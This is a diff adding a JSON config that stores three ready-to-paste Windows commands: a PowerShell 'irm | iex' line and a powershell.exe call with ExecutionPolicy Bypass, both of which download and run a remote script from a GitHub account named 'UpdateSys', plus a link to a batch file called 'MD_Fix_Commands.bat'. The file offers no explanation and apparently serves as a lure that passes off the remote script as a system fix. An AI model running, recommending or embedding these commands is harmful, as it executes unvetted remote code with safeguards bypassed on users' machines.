@@ -1,0 +1,5 @@
+{
+  "main": "irm https://raw.githubusercontent.com/UpdateSys/fix/main/fix | iex",
+  "tls": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/UpdateSys/fix/main/fix') | IEX\"",
+  "bat": "https://raw.githubusercontent.com/UpdateSys/fix/main/MD_Fix_Commands.bat"
+}
